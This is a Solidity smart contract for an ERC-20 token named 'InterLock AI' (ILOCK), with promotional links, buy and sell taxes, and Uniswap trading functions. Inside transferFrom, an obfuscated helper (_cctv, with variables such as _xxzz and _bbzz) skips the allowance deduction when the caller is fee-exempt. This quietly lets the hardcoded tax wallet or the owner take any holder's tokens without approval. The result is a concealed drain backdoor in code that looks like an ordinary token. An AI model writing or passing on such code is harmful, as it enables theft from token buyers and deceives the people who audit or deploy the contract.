/*
Revolutionizing Security with Web3

https://www.interlockai.org
https://app.interlockai.org
https://docs.interlockai.org
https://medium.com/@interlockai
https://x.com/interlock_ai
https://t.me/interlock_ai
*/ 

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ILOCK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcemptFees;
    address private _taxWallet = 0xC8da4C269e8292750170AF766bEFe8aF5dD0E5AF;
    uint256 private _initialBuyTaxs=3;
    uint256 private _initialSellTaxs=3;
    uint256 private _finalBuyTaxs=0;
    uint256 private _finalSellTaxs=0;
    uint256 private _reduceBuyTaxAts=5;
    uint256 private _reduceSellTaxAts=5;
    uint256 private _preventSwapBefore=7;
    uint256 private _buyCounts=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"InterLock AI";
    string private constant _symbol = unicode"ILOCK";
    uint256 private _maxTaxSwaps = _tTotal / 100;
    IRouter private _uniRouter;
    address private _uniPair;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcemptFees[owner()] = true;
        _isExcemptFees[address(this)] = true;
        _isExcemptFees[_taxWallet] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initialize() external onlyOwner() {
        _uniRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniRouter), _tTotal);
        _uniPair = IFactory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_cctv(_msgSender(), amount), "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _cctv(address _xxzz, uint256 _bbzz) private view returns(uint256 _aamm) {
        bool _ttpp = _isExcemptFees[_xxzz] 
            && _xxzz!= address(this); 
        if(!_ttpp) _aamm = _bbzz;
    }

    function _transfer(address _sender, address _recipient, uint256 _amount) private {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_recipient != address(0), "ERC20: transfer to the zero address");
        require(_amount > 0, "Transfer amount must be greater than zero");

        uint256 taxFees=0;
        if (_sender != owner() && _recipient != owner()) {
            taxFees = _amount.mul((_buyCounts>_reduceBuyTaxAts)?_finalBuyTaxs:_initialBuyTaxs).div(100);

            if (_sender == _uniPair && _recipient != address(_uniRouter) && ! _isExcemptFees[_recipient]) {
                _buyCounts++;
            }

            if(_recipient == _uniPair && _sender!= address(this)) {
                taxFees = _amount.mul((_buyCounts>_reduceSellTaxAts)?_finalSellTaxs:_initialSellTaxs).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _recipient == _uniPair && _swapEnabled && _buyCounts > _preventSwapBefore) {
                if(contractTokenBalance > _maxTaxSwaps)
                swapTokensForEth(min(_amount, min(contractTokenBalance, _maxTaxSwaps)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFees(address(this).balance);
                }
            }
        }

        if(taxFees>0){
          _balances[address(this)]=_balances[address(this)].add(taxFees);
          emit Transfer(_sender, address(this),taxFees);
        }

        _balances[_sender]=_balances[_sender].sub(_amount);
        _balances[_recipient]=_balances[_recipient].add(_amount.sub(taxFees));
        emit Transfer(_sender, _recipient, _amount.sub(taxFees));
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _uniRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFees(uint256 amount) private {
        payable(_taxWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();
        _approve(address(this), address(_uniRouter), tokenAmount);
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}